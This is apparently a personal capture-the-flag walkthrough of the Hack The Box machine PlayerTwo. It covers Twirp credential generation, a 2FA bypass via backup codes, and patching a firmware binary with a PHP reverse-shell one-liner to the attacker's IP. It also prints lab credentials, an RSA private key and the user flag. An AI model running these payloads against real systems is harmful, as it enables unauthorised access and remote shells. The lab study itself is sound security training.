```

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/playertwo# nmapAutomatorDirb.sh 10.10.10.170 All
  PORT     STATE SERVICE      VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 0e:7b:11:2c:5e:61:04:6b:e8:1c:bb:47:b8:4d:fe:5a (RSA)
  |   256 18:a0:87:56:64:06:17:56:4d:6a:8c:79:4b:61:56:90 (ECDSA)
  |_  256 b6:4b:fc:e9:62:08:5a:60:e0:43:69:af:29:b3:27:14 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  8545/tcp open  http    (PHP 7.2.24-0ubuntu0.18.04.1)
  | fingerprint-strings:
  |   FourOhFourRequest:
  |     HTTP/1.1 404 Not Found
  |     Date: Fri, 07 Feb 2020 06:54:37 GMT
  |     Connection: close
  |     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
  |     Content-Type: application/json
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  DIRB:
  + http://10.10.10.170/server-status (CODE:403|SIZE:277)

  NIKTO:
  -

  SITE STRUCTURE:
  http://player2.htb/
    assets                          [Status: 301, Size: 311, Words: 20, Lines: 10]
      css                           [Status: 301, Size: 315, Words: 20, Lines: 10]
      js                            [Status: 301, Size: 314, Words: 20, Lines: 10]
        main.js                     [Status: 200, Size: 2406, Words: 184, Lines: 105]
        util.js                     [Status: 200, Size: 12433, Words: 841, Lines: 587]
    composer.json                   [Status: 200, Size: 125, Words: 53, Lines: 9]
    generated                       [Status: 301, Size: 314, Words: 20, Lines: 10]
      ..
    images                          [Status: 301, Size: 311, Words: 20, Lines: 10]
      ..
    index.php                       [Status: 200, Size: 6182, Words: 431, Lines: 134]
    mail.php                        [Status: 200, Size: 113, Words: 14, Lines: 1]
    proto                           [Status: 301, Size: 310, Words: 20, Lines: 10]
      generated.proto               [Status: 200, Size: 266, Words: 45, Lines: 19]
    server-status.php               [Status: 403, Size: 276, Words: 20, Lines: 10]
    src                             [Status: 301, Size: 308, Words: 20, Lines: 10]
      ..
    vendor                          [Status: 301, Size: 311, Words: 20, Lines: 10]
      autoload.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]
      composer                      [Status: 301, Size: 320, Words: 20, Lines: 10]
        installed.json              [Status: 200, Size: 26081, Words: 9343, Lines: 854]
      google                        [Status: 301, Size: 318, Words: 20, Lines: 10]
        ..
      twirp                         [Status: 301, Size: 317, Words: 20, Lines: 10]
        twirp                       [Status: 301, Size: 323, Words: 20, Lines: 10]
          composer.json             [Status: 200, Size: 1601, Words: 429, Lines: 58]
          LICENSE                   [Status: 200, Size: 1086, Words: 153, Lines: 20]
          php                       [Status: 301, Size: 327, Words: 20, Lines: 10]
            src                     [Status: 301, Size: 331, Words: 20, Lines: 10]



2. Initial scans are very sparse. Visiting http://10.10.10.170 gives us a error page (a picture), disclosing the hostname player2.htb.
   Visiting http://10.10.10.170:8545 gives us a error message: "twirp_invalied_route:". Twirp is a simple RPC (Remote Procedure Call)
   framework built on protobuf, developed by Twitch.

   Add player2.htb to /etc/hosts and enumerate again by visiting the two HTTP services.

   Port 80 gives us a page explaining how they're back since the hack of box "Player", and this time better and more secure. But port
   8545 still gives us the same error message.


3. Enumerate port 80 again by running ffuf and/or dirb (all enum found at step 1).

    root@p3:/opt/htb/machines/playertwo# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://player2.htb/FUZZ
      ..
      .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
      .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
      assets                  [Status: 301, Size: 311, Words: 20, Lines: 10]
      generated               [Status: 301, Size: 314, Words: 20, Lines: 10]
      images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
      index                   [Status: 200, Size: 6182, Words: 431, Lines: 134]
      mail                    [Status: 200, Size: 113, Words: 14, Lines: 1]
      proto                   [Status: 301, Size: 310, Words: 20, Lines: 10]
      server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
      src                     [Status: 301, Size: 308, Words: 20, Lines: 10]
      vendor                  [Status: 301, Size: 311, Words: 20, Lines: 10]

    Reading about Twirp and proto; "The .proto file is the source of truth for your service design.". So finding a .proto-file
    would be very desirable. Run another fuzz but this time we look for a .proto-file in the /proto dir.

    root@p3:/opt/htb/machines/playertwo# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://player2.htb/proto/FUZZ.proto
      ..
      generated               [Status: 200, Size: 266, Words: 45, Lines: 19]

    Visiting http://player2.htb/proto/generated.proto shows us the code for the Auth service:
      syntax = "proto3";

      package twirp.player2.auth;
      option go_package = "auth";

      service Auth {
        rpc GenCreds(Number) returns (Creds);
      }

      message Number {
        int32 count = 1; // must be > 0
      }

      message Creds {
        int32 count = 1;
        string name = 2;
        string pass = 3;
      }


4. With found information we can send POST requests to the server to generate credentials. To understand how this works we need to
   read the docs on "How Twirp routes requests". From https://twitchtv.github.io/twirp/docs/routing.html:

     > Twirp works over HTTP 1.1; all RPC methods map to routes that follow the format:
     >  POST /twirp/<package>.<Service>/<Method>
     > The <package> name is whatever value is used for package in the .proto file where the service was defined. The <Service> and
     > <Method> names are CamelCased just as they would be in Go.

   Meaning in our case:
    Package = twirp.player2.auth
    Service = Auth
    Method = GenCreds
    Full Path = twirp.player2.auth.Auth/GenCreds

  Next we need to figure out how to send requests to the server. Reading the docs again show us the syntax for cURL:
     curl --request "POST" \
        --location "http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds" \
        --header "Content-Type:application/json" \
        --data '{"inches": 10}' \
        --verbose

    root@p3:/opt/htb/machines/playertwo# curl player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds -H "Content-Type: application/json" --data '{"inches":"5"}' -v
      ..
      {"name":"0xdf","pass":"Lp-+Q8umLW5*7qkc"}

  Executing it again gives us another set of creds
    root@p3:/opt/htb/machines/playertwo# curl player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds -H "Content-Type: application/json" --data '{"inches":"5"}' -v
      ..
      {"name":"0xdf","pass":"ze+EKe-SGF^5uZQX"}

  We can try to spot a pattern here so lets write the output a bunch of times to a file and then sort the output.
    root@p3:/opt/htb/machines/playertwo# curl -X POST player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds -H "Content-Type: application/json" --data '{"inches":"5"}' >> curl-out.txt | echo  >> curl-out.txt
    root@p3:/opt/htb/machines/playertwo# cat curl-out.txt | sort -u
      {"name":"0xdf","pass":"Lp-+Q8umLW5*7qkc"}
      {"name":"0xdf","pass":"tR@dQnwnZEk95*6#"}
      {"name":"0xdf","pass":"XHq7_WJTA?QD_?E2"}
      {"name":"0xdf","pass":"ze+EKe-SGF^5uZQX"}
      {"name":"jkr","pass":"tR@dQnwnZEk95*6#"}
      {"name":"jkr","pass":"XHq7_WJTA?QD_?E2"}
      {"name":"jkr","pass":"ze+EKe-SGF^5uZQX"}
      {"name":"mprox","pass":"Lp-+Q8umLW5*7qkc"}
      {"name":"mprox","pass":"tR@dQnwnZEk95*6#"}
      {"name":"mprox","pass":"XHq7_WJTA?QD_?E2"}
      {"name":"snowscan","pass":"Lp-+Q8umLW5*7qkc"}
      {"name":"snowscan","pass":"tR@dQnwnZEk95*6#"}
      {"name":"snowscan","pass":"XHq7_WJTA?QD_?E2"}
      {"name":"snowscan","pass":"ze+EKe-SGF^5uZQX"}

  Looking at the data it seems like we have 4 users and 4 passwords, lets add these to user- and password file.


5. At this point I'm stuck. I have nowhere to enter my creds, so went back to enumeration. Looking through the source of player2.htb
   I found a link to the subdomain product.player2.htb/home - directing us to a login page.

   Trying to login gives us the alert "Nope", however using the credentials jkr:Lp-+Q8umLW5*7qkc forwards us to a 2FA. Continue
   enumeration of the product subdomain.

    api                           [Status: 301, Size: 324, Words: 20, Lines: 10]
      totp                        [Status: 200, Size: 25, Words: 3, Lines: 1]
    assets                        [Status: 301, Size: 327, Words: 20, Lines: 10]
      css                         [Status: 301, Size: 331, Words: 20, Lines: 10]
      js                          [Status: 301, Size: 330, Words: 20, Lines: 10]
    conn.php                      [Status: 200, Size: 0, Words: 1, Lines: 1]
    home                          [Status: 302, Size: 0, Words: 1, Lines: 1]
    images                        [Status: 301, Size: 327, Words: 20, Lines: 10]
    index.php                     [Status: 200, Size: 5063, Words: 693, Lines: 236]
    mail.php                      [Status: 200, Size: 112, Words: 14, Lines: 1]
    totp                          [Status: 302, Size: 0, Words: 1, Lines: 1]

    /api/totp seems like a point of interest for extracting data.


6. Reading about 2FA it's possible to bypass the authentication using the Backup Codes. These codes are usually stored locally and
   can hopefully be extracted through the API.

     root@p3:/opt/htb/machines/playertwo/# curl -v product.player2.htb/api/totp -H "Content-type: application/x-www-form-urlencoded" --data '{"action":"backup_codes","clusterNum":"000","username":"jkr","password":"Lp-%2BQ8umLW5*7qkc"}'
       ------------ SNIP ------------
       < HTTP/1.1 200 OK
       ------------ SNIP ------------
       * Connection #0 to host product.player2.htb left intact
       {"error":"Invalid Session"}

   The session is invalid. When loging in on the webpage (product.player2.htb) we get a session cookie, exctract it and use it.
     root@p3:/opt/htb/machines/playertwo/# curl -v product.player2.htb/api/totp -H "Content-type: application/x-www-form-urlencoded" --data '{"action":"backup_codes","clusterNum":"000","username":"jkr","password":"Lp-%2BQ8umLW5*7qkc"}' --cookie "PHPSESSID=trrb5315tukt90ssn5kovj09fg"
         ------------ SNIP ------------
        < HTTP/1.1 200 OK
         ------------ SNIP ------------
        * Connection #0 to host product.player2.htb left intact
        {"user":"jkr","code":"29389234823423"}

    NOTE: Login creds to http://product.player2.htb/home = jkr:Lp-+Q8umLW5*7qkc Backup Code: 29389234823423


7. Once logged in we need to enumerate the site again. At the bottom of the page we find "Please read our documentation here",
   clicking on "here" forwards us to http://product.player2.htb/protobs.pdf - containing information about protobs firmware v1.0.

   At the bottom of the PDF we find a link to download the firmware:
    http://product.player2.htb/protobs/protobs_firmware_v1.0.tar

   And another link where we can upload files / firmware (possible RCE):
    http://product.player2.htb/protobs/

   Uploading the downloaded .tar-file gives us the following alert messages:
    > "Verifying signature of the firmware"
    > "It looks legit. Proceeding for provision test"
    > "All checks passed. Firmware is ready for deployment"

   Fuzzing gives us something interesting:
     root@p3:/opt/htb/machines/playertwo/protobs# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://product.player2.htb/protobs/FUZZ
        index                     [Status: 302, Size: 0, Words: 1, Lines: 1]
        keys                      [Status: 301, Size: 333, Words: 20, Lines: 10]
          sign                    [Status: 200, Size: 64, Words: 1, Lines: 1]
          verify                  [Status: 200, Size: 64, Words: 1, Lines: 1]
        uploads                   [Status: 301, Size: 336, Words: 20, Lines: 10]
        verify                    [Status: 302, Size: 0, Words: 1, Lines: 1]

   root@p3:/opt/htb/machines/playertwo/protobs# curl http://product.player2.htb/protobs/keys/sign
      58c848f2f024148b4535adb5aafcaa6645a448fca2c788dcb116e7a8b5398ecf
   root@p3:/opt/htb/machines/playertwo/protobs# curl http://product.player2.htb/protobs/keys/verify
      a7bbbbd96903bcbae931e41727c33e94dac13957843dbe167dd8af21876f5baa

   Both keys looks like salted SHA1 hashes (SHA1 = 40 chars, salt = 25 chars)

   Reading the PDF again one of the Security Considerations is as follows:
    > "Theft of private signing key: Private signing keys that are not properly protected are at risk of theft, allowing a successful
    >  attacker to sign arbitrary code. Limited revocation mechanisms in some systems that rely on code signing exacerbate this threat."

   Digging in to the keys it seems like it's a rabbit hole, unfortunately.


8. Extract the .tar-file and grab the ELF-file from the binary.

    root@p3:/opt/htb/machines/playertwo/protobs# file Protobs.bin
      Protobs.bin: data

    root@p3:/opt/htb/machines/playertwo/protobs# binwalk Protobs.bin
      DECIMAL       HEXADECIMAL     DESCRIPTION
      --------------------------------------------------------------------------------
      64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)

    root@p3:/opt/htb/machines/playertwo/protobs# readelf -h Protobs.bin
      readelf: Error: Not an ELF file - it has the wrong magic bytes at the start

    root@p3:/opt/htb/machines/playertwo/protobs# objdump -d Protobs.bin
      objdump: Protobs.bin: file format not recognized

    root@p3:/opt/htb/machines/playertwo/protobs# xxd Protobs.bin | head -n 5
      00000000: 5641 7eb5 877e 1ef4 b1ea a18b c792 d494  VA~..~..........
      00000010: 1c9c b8b3 1145 e0b7 30da 24d3 4799 19f3  .....E..0.$.G...
      00000020: fbf2 5574 d1b1 3c53 b262 68f3 eb2a 49c5  ..Ut..<S.bh..*I.
      00000030: 1b24 fe33 f51a fa3e b6b4 b905 610b cb03  .$.3...>....a...
      00000040: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............

   We have an ELF Header starting on line 0x40, we can extract it using binwalk --dd.
    root@p3:/opt/htb/machines/playertwo/protobs# binwalk --dd='.*' Protobs.bin

      DECIMAL       HEXADECIMAL     DESCRIPTION
      --------------------------------------------------------------------------------
      64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)

    root@p3:/opt/htb/machines/playertwo/protobs/_Protobs.bin.extracted# ls -al
      total 28
      drwxr-xr-x 2 root root  4096 Feb 19 16:29 .
      drwxr-xr-x 3 root root  4096 Feb 19 16:29 ..
      -rw-r--r-- 1 root root 17200 Feb 19 16:29 40

    root@p3:/opt/htb/machines/playertwo/protobs/_Protobs.bin.extracted# readelf -h 40
      ELF Header:
        Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
        Class:                             ELF64
        Data:                              2's complement, little endian
        Version:                           1 (current)
        OS/ABI:                            UNIX - System V
        ABI Version:                       0
        Type:                              EXEC (Executable file)
        Machine:                           Advanced Micro Devices X86-64
        Version:                           0x1
        Entry point address:               0x4010f0
        Start of program headers:          64 (bytes into file)
        Start of section headers:          15408 (bytes into file)
        Flags:                             0x0
        Size of this header:               64 (bytes)
        Size of program headers:           56 (bytes)
        Number of program headers:         11
        Size of section headers:           64 (bytes)
        Number of section headers:         28
        Section header string table index: 27


9. Import the ELF-file (40) to ghidra and decompile it. By pressing "O" we can extract all functions to a .c-file, analyze it to
   find a vulnerability to exploit.

   Analyzing the exported .c-file we can see some system commands being run within the program, here we can get RCE.
     root@p3:/opt/htb/machines/playertwo/protobs/_Protobs.bin.extracted# cat 40-decompiled.c | grep system
      int system(char *__command)
        iVar1 = system(__command);
        system("stty raw -echo min 0 time 10");
          system("stty sane");
        system("stty sane");

    We can do a simple POC of RCE and try ping before going for a reverse shell. Import the original binary, Protobs.bin,
    (x86, 64, little endian, gcc) to ghidra and look for the hex-value of "stty raw -echo min 0 time 10". We find it on line
    000020e0 - 000020f0, replace the command with a simple ping.

      000020e0    2e 2e 2e 00 73 74 74 79 20 72 61 77 20 2d 65 63     ....stty raw -ec
      000020f0    68 6f 20 6d 69 6e 20 30 20 74 69 6d 65 20 31 30     ho min 0 time 10

      000020e0    2e 2e 2e 00 70 69 6e 67 20 31 30 2e 31 30 2e 31     ....ping 10.10.1
      000020f0    34 2e 36 00 00 00 00 00 00 00 00 00 00 00 00 00     4.6.............

    Export the program by pressing "O" and save it with the name Protobs.bin. Tar the files Protobs.bin, info.txt and version,
    start tcpdump, upload the .tar-file to product.player2.htb/protobs/ and verify that you get incoming icmp traffic.

    root@p3:/opt/htb/machines/playertwo/protobs# tar -cvf test.tar Protobs.bin info.txt version
      Protobs.bin
      info.txt
      version

    root@p3:/opt/htb/machines/playertwo# tcpdump -i tun0 icmp
      tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
      listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
      08:02:25.222017 IP player2.htb > p3: ICMP echo request, id 43220, seq 1, length 64
      08:02:25.222034 IP p3 > player2.htb: ICMP echo reply, id 43220, seq 1, length 64
      08:02:26.224101 IP player2.htb > p3: ICMP echo request, id 43220, seq 2, length 64
      08:02:26.224142 IP p3 > player2.htb: ICMP echo reply, id 43220, seq 2, length 64


10. Weaponize the payload to give us a shell using a php reverse one liner.

      000020e0    2e 2e 2e 00 70 68 70 20 2d 72 20 27 24 73 6f 63     ....php -r '$soc
      000020f0    6b 3d 66 73 6f 63 6b 6f 70 65 6e 28 22 31 30 2e     k=fsockopen("10.
      00002100    31 30 2e 31 34 2e 36 22 2c 34 34 38 38 29 3b 65     10.14.6",4488);e
      00002110    78 65 63 28 22 2f 62 69 6e 2f 73 68 20 2d 69 20     xec("/bin/sh -i
      00002120    3c 26 33 20 3e 26 33 20 32 3e 26 33 22 29 3b 27     <&3 >&3 2>&3");'

     root@p3:/opt/htb/machines/playertwo/protobs# nc -lvnp 4488
        listening on [any] 4488 ...
        connect to [10.10.14.6] from (UNKNOWN) [10.10.10.170] 60632
        /bin/dash: 0: can't access tty; job control turned off
        $ whoami
          www-data

    Upgrade the shell before looking for the user.
      www-data@player2:/var/www/product/protobs$


11. Enumerate the box using linpeas.sh and we find a two local services - mysql on 3306 and mqtt on 1883.

      www-data@player2:/dev/shm$ ./linpeas.sh
        ..
        [+] Active Ports
        Active Internet connections (servers and established)
        Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
        tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
        tcp        0      0 127.0.0.1:1883          0.0.0.0:*               LISTEN      -

    Reading about Mosquitto (mqtt) it can be used for privesc. Download mqtt client shell and sub to system messages.

      www-data@player2:/dev/shm$ python mqtt_client_shell.py
        > connection
        > connect
        > subscribe "$SYS/#"
          ..
          on_message(): message received: Topic: $SYS/internal/firmware/signing, QoS: 0, Payload Length: 1679
            Payload (str): -----BEGIN RSA PRIVATE KEY-----
            MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
            R0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4
            et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT
            +kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz
            SM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE
            +UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd
            62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN
            wANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D
            62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO
            91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC
            gw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/Y
            QACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f
            llga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos
            JqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3
            JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt
            ioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP
            QFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T
            pp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4
            hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRf
            PYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI
            NoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt
            uaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6M
            zxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK
            /1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz
            iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==
            -----END RSA PRIVATE KEY-----

    Looking in /home we find the user observer.


12. Write the private key to a file, change permissions (600), and login to grab user.txt

    root@p3:/opt/htb/machines/playertwo# ssh observer@player2.htb -i id_rsa-observer
    observer@player2:~$ cat user.txt
      CDE09DC7E49C92C78ECAC1535E241251


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


Kanske liknande Ellingson/Frolic?


1.

observer@player2:/opt/Configuration_Utility$ ls -al
total 2164
drwxr-x--- 2 root observer    4096 Nov 16 15:23 .
drwxr-xr-x 3 root root        4096 Dec 17 10:47 ..
-rwxr-xr-x 1 root root      179032 Nov 15 15:57 ld-2.29.so
-rwxr-xr-x 1 root root     2000480 Nov 15 15:57 libc.so.6
-rwsr-xr-x 1 root root       22440 Dec 17 13:41 Protobs

strings Protobs
..
GLIBC_2.4
GLIBC_2.2.5
..
GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Twirp:
  https://twitchtv.github.io/twirp/docs/intro.html
  https://twitchtv.github.io/twirp/docs/install.html
  https://github.com/twitchtv/twirp/blob/master/docs/routing.md
  https://github.com/twitchtv/twirp/tree/master/internal/twirptest/proto
  https://github.com/golang/protobuf/tree/master/proto
  https://github.com/emmaly/ge

2FA Bypass using Backup Codes:
  http://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html

SHA1 Hash Length:
  https://hashcat.net/forum/thread-3161.html

Reverse Engineer Binary:
  https://0x00sec.org/t/reverse-engineering-challenge-disassemble-it/987/3
  https://vi.stackexchange.com/questions/343/how-to-edit-binary-files-with-vim
  https://stackoverflow.com/questions/36530643/use-binwalk-to-extract-all-files

Binwalk Extract Chunks:
  https://stackoverflow.com/questions/1423346/how-do-i-extract-a-single-chunk-of-bytes-from-within-a-file

Digital Signatures (openssl):
  http://openssl.cs.utah.edu/docs/apps/dgst.html

MQTT Mosquitto:
  https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto
  https://github.com/bapowell/python-mqtt-client-shell

```
